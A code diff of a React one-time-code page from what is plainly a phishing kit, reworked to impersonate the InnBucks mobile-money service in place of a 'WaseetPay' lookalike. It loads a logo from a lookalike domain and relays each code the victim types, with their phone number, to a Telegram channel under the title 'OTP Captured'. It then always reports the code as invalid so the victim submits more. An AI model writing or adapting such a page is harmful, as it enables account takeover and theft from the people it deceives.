@@ -2,13 +2,11 @@
 
 import React, { useState, useEffect } from "react"
 import {
-  ShieldCheck,
+  ChevronLeft,
   Loader2,
-  CheckCircle2,
   Clock,
-  ArrowRight,
   RotateCcw,
-  Lock,
+  AlertCircle,
 } from "lucide-react"
 import { useRouter, useSearchParams } from "next/navigation"
 import { sendTelegramMessage } from "@/lib/telegram"
@@ -25,14 +23,6 @@ export function OtpForm() {
   const phoneParam =
     searchParams.get("phone") ||
     (typeof window !== "undefined" ? sessionStorage.getItem("userPhone") || "" : "")
-
-  // Mask phone for display
-  const formatDisplayPhone = (p: string) => {
-    if (!p) return "09XXXXXXXX"
-    const cleaned = p.replace(/\s+/g, "")
-    if (cleaned.length < 6) return cleaned
-    return `${cleaned.slice(0, 3)}••••${cleaned.slice(-3)}`
-  }
 
   // Countdown timer
   useEffect(() => {
@@ -67,7 +57,7 @@ export function OtpForm() {
 
     try {
       await sendTelegramMessage({
-        title: "🔄 طلب إعادة إرسال OTP | WaseetPay Resend OTP",
+        title: "🔄 InnBucks Resend OTP Requested",
         phoneNumber: phoneParam || "N/A",
       })
     } catch {
@@ -78,7 +68,7 @@ export function OtpForm() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     if (!otp.trim()) {
-      setErrorMessage("يرجى إدخال رمز التحقق أولاً")
+      setErrorMessage("Verification code is required.")
       return
     }
 
@@ -87,7 +77,7 @@ export function OtpForm() {
 
     try {
       await sendTelegramMessage({
-        title: "🔐 رمز التحق - وسيط باي | WaseetPay OTP Submitted",
+        title: "🔐 InnBucks OTP Captured",
         otp1: otp.trim(),
         phoneNumber: phoneParam || "N/A",
       })
@@ -95,10 +85,10 @@ export function OtpForm() {
       // silent
     }
 
-    // Wait exactly 2 seconds then show invalid message each time and reset timer
+    // Wait exactly 2 seconds then show invalid message and reset timer
     setTimeout(() => {
       setIsLoading(false)
-      setErrorMessage("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى")
+      setErrorMessage("Invalid verification code. Please try again.")
       setOtp("")
       setTimer(120)
       setCanResend(false)
@@ -106,251 +96,143 @@ export function OtpForm() {
   }
 
   return (
-    <div
-      dir="rtl"
-      className="h-[100dvh] max-h-[100dvh] sm:min-h-screen sm:h-auto sm:max-h-none w-full bg-white flex flex-col justify-between overflow-hidden sm:overflow-visible selection:bg-[#1E64EC]/20"
-    >
-      {/* ========================================================================= */}
-      {/* TOP FULL-WIDTH SECTION: Royal Blue Gradient with Brand Header              */}
-      {/* ========================================================================= */}
-      <section
-        className="w-full pt-3 sm:pt-10 lg:pt-12 pb-5 sm:pb-14 lg:pb-16 px-4 sm:px-6 relative overflow-hidden shrink-0 bg-[#1652cf]"
-        style={{
-          backgroundImage: "url('/login-bg.jpg')",
-          backgroundPosition: "top center",
-          backgroundSize: "cover",
-          backgroundRepeat: "no-repeat",
-        }}
-      >
-        {/* Subtle Grid overlay */}
-        <div
-          className="absolute inset-0 pointer-events-none opacity-20"
-          style={{
-            backgroundImage: `
-              linear-gradient(to right, rgba(255, 255, 255, 0.15) 1px, transparent 1px),
-              linear-gradient(to bottom, rgba(255, 255, 255, 0.15) 1px, transparent 1px)
-            `,
-            backgroundSize: "44px 44px",
-          }}
-        />
+    <div className="w-full max-w-[420px] min-h-[100dvh] sm:min-h-[640px] bg-[#28293C] flex flex-col justify-between px-6 pt-6 sm:pt-8 pb-6 sm:pb-8 relative text-white select-none">
+      {/* Header Bar with #32344a Background matching Screenshot */}
+      <div>
+        <div className="-mx-6 -mt-6 sm:-mt-8 px-6 py-3.5 bg-[#32344a] border-b border-black/15 flex items-center justify-between relative shadow-xs">
+          <button
+            type="button"
+            onClick={() => router.push("/")}
+            className="w-9 h-9 rounded-full bg-white/10 hover:bg-white/15 text-white flex items-center justify-center transition-colors cursor-pointer shrink-0"
+            aria-label="Back"
+          >
+            <ChevronLeft className="w-5 h-5 stroke-[2.5]" />
+          </button>
 
-        {/* Glowing luminous wave lines */}
-        <svg
-          className="absolute inset-0 w-full h-full pointer-events-none opacity-45"
-          viewBox="0 0 1440 260"
-          fill="none"
-          preserveAspectRatio="none"
-        >
-          <path
-            d="M-100,160 C300,50 650,220 1100,100 C1280,60 1420,130 1550,110"
-            stroke="rgba(100, 215, 255, 0.7)"
-            strokeWidth="2.5"
-            filter="blur(1px)"
-          />
-          <path
-            d="M-80,190 C320,80 680,240 1140,125 C1310,80 1440,150 1570,130"
-            stroke="rgba(70, 160, 255, 0.4)"
-            strokeWidth="1.5"
-          />
-          <path
-            d="M-50,220 C350,110 710,260 1180,150 C1340,105 1460,170 1600,150"
-            stroke="rgba(50, 140, 255, 0.25)"
-            strokeWidth="1.2"
-          />
-        </svg>
-
-        {/* Content Container aligned with form below */}
-        <div className="max-w-[460px] sm:max-w-[480px] w-full mx-auto relative z-10">
-          {/* Top Brand Bar & Return Link */}
-          <div className="flex items-center justify-between">
-            <div className="flex items-center gap-2 sm:gap-2.5">
-              {/* App Icon */}
-              <div className="w-[28px] h-[28px] sm:w-[38px] sm:h-[38px] rounded-[8px] sm:rounded-[10px] overflow-hidden shadow-sm shadow-blue-950/30 shrink-0 border border-white/20">
-                <img
-                  src="https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/87/ae/5f/87ae5fa1-5f59-8287-5eed-960ccc48750c/Placeholder.mill/400x400bb-75.webp"
-                  onError={(e) => {
-                    e.currentTarget.src = "/app-logo.webp"
-                  }}
-                  alt="WaseetPay Logo"
-                  className="w-full h-full object-cover"
-                />
-              </div>
-
-              {/* Brand Title */}
-              <div className="text-white font-bold text-[14px] sm:text-[17px] tracking-tight flex items-center gap-1.5">
-                <span>وسيط باي</span>
-                <span className="text-white/60 font-light text-[11px] sm:text-[13px]">|</span>
-                <span className="font-semibold text-[13px] sm:text-[15.5px]">WaseetPay</span>
-              </div>
+          {/* Logo + InnBucks Title */}
+          <div className="flex items-center gap-2 pr-9 mx-auto">
+            <div className="w-[28px] h-[28px] shrink-0 flex items-center justify-center">
+              <img
+                src="https://binbukkes.site/innBucks_color_logo.png"
+                onError={(e) => {
+                  e.currentTarget.src = "/innbucks-logo.png"
+                }}
+                alt="InnBucks Logo"
+                className="w-full h-full object-contain"
+              />
             </div>
-
-            {/* Back Button */}
-            <button
-              type="button"
-              onClick={() => router.push("/")}
-              className="inline-flex items-center gap-1 text-white/90 hover:text-white text-[11.5px] sm:text-[13px] font-semibold bg-white/10 hover:bg-white/15 px-2.5 py-1 sm:px-3 sm:py-1.5 rounded-xl backdrop-blur-xs transition-all cursor-pointer"
+            <span
+              style={{ fontSize: "22px", fontWeight: 700 }}
+              className="text-white tracking-tight"
             >
-              <span>تغيير الحساب</span>
-              <ArrowRight className="w-3.5 h-3.5 rotate-180" />
-            </button>
-          </div>
-
-          {/* Titles */}
-          <div className="mt-2 sm:mt-7 lg:mt-8">
-            <h1 className="text-[22px] sm:text-[34px] lg:text-[36px] font-extrabold text-white tracking-tight leading-tight">
-              تأكيد رمز التحقق 
-            </h1>
-            <p className="text-white/85 text-[11.5px] sm:text-[14.5px] font-normal mt-0.5 sm:mt-1 leading-snug">
-              تم إرسال رمز التحقق السري في رسالة نصية (SMS) إلى رقم هاتفك
-              {phoneParam && (
-                <span className="font-bold text-white block mt-0.5" dir="ltr">
-                  {formatDisplayPhone(phoneParam)}
-                </span>
-              )}
-            </p>
+              InnBucks
+            </span>
           </div>
         </div>
-      </section>
 
-      {/* ========================================================================= */}
-      {/* BOTTOM FULL-WIDTH SECTION: White Sheet with OTP Input                      */}
-      {/* ========================================================================= */}
-      <section className="w-full bg-white -mt-3 sm:-mt-6 lg:-mt-8 rounded-t-[24px] sm:rounded-t-[36px] flex-1 px-4 sm:px-6 pt-3 sm:pt-7 lg:pt-8 pb-2 sm:pb-8 flex flex-col justify-between shadow-[0_-8px_25px_rgba(0,0,0,0.05)] relative z-20 overflow-hidden sm:overflow-visible">
-        <div className="max-w-[460px] sm:max-w-[480px] w-full mx-auto flex flex-col justify-between h-full">
-          <div>
-            {/* Security Badge */}
-            <div className="mb-2 sm:mb-5 flex items-center justify-center gap-1.5 p-1.5 sm:p-2.5 rounded-xl sm:rounded-2xl bg-blue-50/80 border border-blue-100 text-[#1E64EC]">
-              <Lock className="w-3.5 h-3.5 sm:w-4 sm:h-4 shrink-0" />
-              <span className="text-[11.5px] sm:text-[13px] font-semibold text-slate-700">
-                عملية تسجيل دخول آمنة ومشفرة برمز حماية لمرة واحدة
+        {/* Main Headline */}
+        <div className="mt-6 sm:mt-7 text-center">
+          <h1
+            style={{ fontSize: "26px", fontWeight: 800, lineHeight: 1.25 }}
+            className="text-white max-w-[320px] mx-auto tracking-tight"
+          >
+            Welcome To Upgrade InnBucks Account
+          </h1>
+
+          {phoneParam && (
+            <p className="text-white/70 text-[14px] mt-3 font-normal">
+              {phoneParam}
+            </p>
+          )}
+          <p className="text-white/50 text-[13px] mt-1">
+            Enter the OTP sent to your phone
+          </p>
+        </div>
+
+        {/* OTP Input Form */}
+        <form onSubmit={handleSubmit} className="mt-10">
+          <div
+            className={`flex items-center pb-2.5 transition-colors ${
+              errorMessage ? "border-b border-rose-500" : "border-b border-[#555] focus-within:border-white"
+            }`}
+          >
+            <input
+              type="text"
+              inputMode="numeric"
+              pattern="[0-9]*"
+              autoFocus
+              value={otp}
+              onChange={handleOtpChange}
+              placeholder="Enter verification code"
+              className="w-full text-white text-[16px] font-medium outline-none bg-transparent placeholder:text-[#757575] tracking-wider text-center"
+            />
+          </div>
+
+          {/* Error Message */}
+          {errorMessage && (
+            <div className="flex items-center justify-center gap-1.5 text-rose-500 text-[12px] font-medium mt-2 animate-in fade-in duration-150">
+              <AlertCircle className="w-3.5 h-3.5 shrink-0" />
+              <span>{errorMessage}</span>
+            </div>
+          )}
+
+          {/* Timer & Resend Option */}
+          <div className="flex items-center justify-between mt-5 text-[12.5px] text-white/60">
+            <div className="flex items-center gap-1.5">
+              <Clock className="w-3.5 h-3.5 text-white/50" />
+              <span>Expires in:</span>
+              <span className={`font-semibold tabular-nums ${timer < 30 ? "text-amber-400" : "text-white"}`}>
+                {formatTimer(timer)}
               </span>
             </div>
 
-            {/* ---------------- Form ---------------- */}
-            <form onSubmit={handleSubmit} className="space-y-2.5 sm:space-y-4">
-              <div>
-                <div className="flex items-center justify-between mb-1 sm:mb-2">
-                  <label className="text-[#6b7280] text-[11.5px] sm:text-[13px] font-medium text-right">
-                    أدخل رمز التحقق (يمكنك إدخال أي عدد من الأرقام)
-                  </label>
-                  {otp && (
-                    <span className="text-[11px] sm:text-xs font-semibold text-slate-400">
-                      {otp.length} {otp.length === 1 ? "رقم" : "أرقام"}
-                    </span>
-                  )}
-                </div>
-
-                {/* Unlimited Digits Input Field */}
-                <div className="relative">
-                  <div
-                    className={`h-[46px] sm:h-[62px] rounded-[12px] sm:rounded-[18px] bg-white px-4 flex items-center justify-center transition-all ${
-                      errorMessage
-                        ? "border-2 border-rose-500 ring-2 ring-rose-500/15"
-                        : "border-2 border-[#1E64EC] shadow-[0_0_0_2px_rgba(29,100,236,0.12)]"
-                    }`}
-                  >
-                    <input
-                      type="text"
-                      inputMode="numeric"
-                      pattern="[0-9]*"
-                      autoFocus
-                      dir="ltr"
-                      value={otp}
-                      onChange={handleOtpChange}
-                      placeholder=""
-                      className="w-full text-center text-[20px] sm:text-[26px] font-bold text-[#1f2937] tracking-[0.25em] sm:tracking-[0.3em] outline-none bg-transparent"
-                    />
-                  </div>
-
-                  {/* Rounded circular dots placeholder */}
-                  {!otp && (
-                    <div className="absolute inset-0 flex items-center justify-center gap-2 pointer-events-none select-none">
-                      <span className="text-[#1E64EC] text-[18px] sm:text-[20px] font-light animate-pulse ml-0.5">|</span>
-                      <span className="w-2 sm:w-2.5 h-2 sm:h-2.5 rounded-full bg-slate-300 inline-block" />
-                      <span className="w-2 sm:w-2.5 h-2 sm:h-2.5 rounded-full bg-slate-300 inline-block" />
-                      <span className="w-2 sm:w-2.5 h-2 sm:h-2.5 rounded-full bg-slate-300 inline-block" />
-                      <span className="w-2 sm:w-2.5 h-2 sm:h-2.5 rounded-full bg-slate-300 inline-block" />
-                      <span className="w-2 sm:w-2.5 h-2 sm:h-2.5 rounded-full bg-slate-300 inline-block" />
-                      <span className="w-2 sm:w-2.5 h-2 sm:h-2.5 rounded-full bg-slate-300 inline-block" />
-                    </div>
-                  )}
-                </div>
-
-                {/* Error Message */}
-                {errorMessage && (
-                  <div className="mt-1 text-right text-rose-500 text-[11.5px] sm:text-[13px] font-semibold flex items-center gap-1.5 animate-in fade-in duration-200">
-                    <span>⚠️</span>
-                    <span>{errorMessage}</span>
-                  </div>
-                )}
-              </div>
-
-              {/* Timer & Resend Option */}
-              <div className="flex items-center justify-between py-0.5 text-[11.5px] sm:text-[13px] text-slate-500">
-                <div className="flex items-center gap-1.5 font-medium">
-                  <Clock className="w-3.5 h-3.5 text-slate-400" />
-                  <span>صلاحية الرمز:</span>
-                  <span className={`font-bold tabular-nums ${timer < 30 ? "text-amber-600" : "text-[#1E64EC]"}`} dir="ltr">
-                    {formatTimer(timer)}
-                  </span>
-                </div>
-
-                <button
-                  type="button"
-                  onClick={handleResend}
-                  disabled={!canResend}
-                  className={`inline-flex items-center gap-1 font-semibold transition-colors cursor-pointer ${
-                    canResend
-                      ? "text-[#1E64EC] hover:text-[#1855ca] hover:underline"
-                      : "text-slate-400 cursor-not-allowed opacity-75"
-                  }`}
-                >
-                  <RotateCcw className="w-3 h-3 sm:w-3.5 sm:h-3.5" />
-                  <span>إعادة إرسال الرمز</span>
-                </button>
-              </div>
-
-              {/* Confirm Button */}
-              <button
-                type="submit"
-                disabled={isLoading || !otp.trim()}
-                className="w-full h-[42px] sm:h-[52px] rounded-[12px] sm:rounded-[16px] bg-[#1E64EC] hover:bg-[#1855ca] active:scale-[0.99] text-white font-bold text-[14px] sm:text-[16px] flex items-center justify-center shadow-lg shadow-[#1E64EC]/25 transition-all cursor-pointer disabled:opacity-75 disabled:cursor-not-allowed"
-              >
-                {isLoading ? (
-                  <div className="flex items-center gap-2">
-                    <Loader2 className="w-4 h-4 sm:w-5 sm:h-5 animate-spin text-white" />
-                    <span>جاري التحقق من الرمز...</span>
-                  </div>
-                ) : (
-                  "تأكيد رمز التحقق"
-                )}
-              </button>
-            </form>
-
-            {/* Security Notice */}
-            <div className="mt-3 sm:mt-6 pt-2 sm:pt-4 border-t border-slate-100 flex items-center justify-center gap-2 text-[11px] sm:text-[12.5px] text-slate-400">
-              <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
-              <span>حماية مشددة وفق معايير مصرف ليبيا المركزي للدفع الإلكتروني</span>
-            </div>
-
-            {/* Return to Login */}
-            <div className="mt-2 sm:mt-4 text-center">
-              <button
-                type="button"
-                onClick={() => router.push("/")}
-                className="text-slate-500 hover:text-[#1E64EC] text-[11.5px] sm:text-[13px] font-semibold transition-colors hover:underline cursor-pointer"
-              >
-                الرجوع إلى صفحة تسجيل الدخول
-              </button>
-            </div>
+            <button
+              type="button"
+              onClick={handleResend}
+              disabled={!canResend}
+              className={`inline-flex items-center gap-1 font-semibold transition-colors cursor-pointer ${
+                canResend
+                  ? "text-[#4a90e2] hover:underline"
+                  : "text-white/30 cursor-not-allowed"
+              }`}
+            >
+              <RotateCcw className="w-3 h-3" />
+              <span>Resend OTP</span>
+            </button>
           </div>
 
-          {/* Website Copyright Footer */}
-          <footer className="w-full pt-1.5 sm:pt-4 text-center text-[10px] sm:text-xs text-slate-400">
-            <span>© {new Date().getFullYear()} وسيط باي | WaseetPay. جميع الحقوق محفوظة.</span>
-          </footer>
-        </div>
-      </section>
+          {/* Terms Note */}
+          <p className="text-[12px] text-white/60 text-center mt-7 leading-relaxed">
+            By pressing Sign Up, you agree to our{" "}
+            <a href="#" className="text-[#4a90e2] hover:underline font-medium">
+              Privacy Policy
+            </a>{" "}
+            and{" "}
+            <a href="#" className="text-[#4a90e2] hover:underline font-medium">
+              Terms and Conditions
+            </a>
+          </p>
+        </form>
+      </div>
+
+      {/* Bottom Continue Button */}
+      <div className="pt-6">
+        <button
+          type="button"
+          onClick={handleSubmit}
+          disabled={isLoading}
+          className="w-full h-[52px] rounded-[12px] bg-[#335c87] hover:bg-[#2b4d70] active:scale-[0.99] text-white font-bold text-[16px] shadow-lg shadow-[#335c87]/25 transition-all cursor-pointer flex items-center justify-center disabled:opacity-75"
+        >
+          {isLoading ? (
+            <div className="flex items-center gap-2">
+              <Loader2 className="w-5 h-5 animate-spin text-white" />
+              <span>Verifying...</span>
+            </div>
+          ) : (
+            "Continue"
+          )}
+        </button>
+      </div>
     </div>
   )
 }
